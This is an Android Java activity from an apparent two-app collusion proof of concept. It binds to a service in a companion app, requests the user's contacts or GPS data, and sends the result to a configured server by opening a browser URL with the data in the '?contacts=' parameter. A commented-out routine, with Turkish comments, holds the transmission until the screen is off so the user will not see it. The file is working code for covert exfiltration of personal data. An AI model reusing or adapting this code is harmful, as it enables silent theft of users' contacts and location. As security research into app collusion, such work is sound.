package com.ouz.second;
import com.ouz.first.BGService;

import android.support.v7.app.ActionBarActivity;
import android.util.Log;
import android.view.View;
import android.widget.TextView;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.Messenger;
import android.os.PowerManager;
import android.os.RemoteException;



public class SecondAppMainActivity extends ActionBarActivity {

	/**
	 * Messenger used for receiving responses from service.
	 */
	final Messenger mMessenger = new Messenger(new IncomingHandler());
	/**
	 * Messenger used for communicating with service.
	 */
	Messenger mService = null;

	boolean mServiceConnected = false;
	

	
	
	/**
	 * Class for interacting with the main interface of the service.
	 */
	private ServiceConnection mConn = new ServiceConnection() {
		@Override
		public void onServiceConnected(ComponentName className, IBinder service) {
			Log.d("MessengerActivity", "Connected to service. Registering our Messenger in the Service...");
			mService = new Messenger(service);
			mServiceConnected = true;

			// Register our messenger also on Service side:
			Message msg = Message.obtain(null, BGService.MESSAGE_TYPE_REGISTER);
			msg.replyTo = mMessenger;
			try {
				mService.send(msg);
			} catch (RemoteException e) {
				// We always have to trap RemoteException (DeadObjectException
				// is thrown if the target Handler no longer exists)
				e.printStackTrace();
			}
		}

		/**
		 * Connection dropped.
		 */
		@Override
		public void onServiceDisconnected(ComponentName className) {
			Log.d("MessengerActivity", "Disconnected from service.");
			mService = null;
			mServiceConnected = false;
		}
	};


	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_second_app_main);
		sendToService("TEST");
	
	}
	
	@Override
	public void onStart() {
		super.onStart();
		bindService(new Intent("com.ouz.first.BGService"), mConn, Context.BIND_AUTO_CREATE);
	}
	
	/**protected void onStop() {
		super.onStop();
		if (mServiceConnected) {
			unbindService(mConn);
			stopService(new Intent(this, BGService.class));
			mServiceConnected = false;
		}
	}**/
	
	class IncomingHandler extends Handler {
		@Override
		public void handleMessage(Message msg) {
			if (msg.what == BGService.MESSAGE_TYPE_TEXT) {
				Bundle b = msg.getData();
				String text = null;
				if (b != null) {
					text = b.getString("data");
				} else {
					text = "Service responded with empty message";
				}
				Log.d("MessengerActivity", "Response: " + text);
				TextView responseFromService = (TextView) findViewById(R.id.textView1);
				responseFromService.setText(text);
				
			} else {
				super.handleMessage(msg);
			}
			checkScreenisOff();
		}

		private void checkScreenisOff() {
			/**PowerManager pm = (PowerManager)
			getSystemService(Context.POWER_SERVICE);
			boolean isScreenOn = pm.isScreenOn();
			if (isScreenOn){
				Log.w("SecondApp", "Screen is ON!");
				try {
					Thread.sleep(4000);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
				checkScreenisOff();
				
			} else{
				// Ekran kapaliyken browser acalim
			Log.w("SecondApp", "Screen is OFF now, lets send data"); **/
			TextView responseFromService = (TextView) findViewById(R.id.textView1);
			Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(getString(R.string.server_IP) + "?contacts=" + responseFromService.getText().toString()));
			//Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("http://192.168.2.2?contacts.html"));
			startActivity(browserIntent);
			Log.w("SecondApp", "Contacts Data : " + responseFromService.getText().toString());
			//}
			
		}
	}
	
	/**
	 * Sends message with text stored in bundle extra data ("data" key).
	 * 
	 * @param text
	 *            text to send
	 */
	void sendToService(String text) {
		if (mServiceConnected) {
			Log.d("MessengerActivity", "Sending message to service: " + text);
			Message msg = Message.obtain(null, BGService.MESSAGE_TYPE_TEXT);
			Bundle b = new Bundle();
			b.putString("data", text);
			msg.setData(b);
			try {
				mService.send(msg);
			} catch (RemoteException e) {
				// We always have to trap RemoteException (DeadObjectException
				// is thrown if the target Handler no longer exists)
				e.printStackTrace();
			}
		} else {
			Log.d("MessengerActivity", "Cannot send - not connected to service.");
		}
	}

	//Servisten gelen cevabi karsilayan kisim
	/**class IncomingHandler extends Handler {

		public void handleMessage(Message msg) {
			Bundle bundle = msg.getData();        	
			String responseData = null;
			if (bundle != null) {
				responseData = bundle.getString("data");
			} 
			else {
				responseData = "Service responded with empty message";
			}
			txtview = (TextView) findViewById(R.id.textView1);
			txtview.setText(responseData);

		}
	}**/	

	//Servise gonderilecek istegi belirlten yer

	public void getContactsMessageSend(View view){
		//sendMessage(view, "1");
		sendToService("1");
	}

	public void getGPSMessageSend(View view){
		sendToService("2");
	}		


}
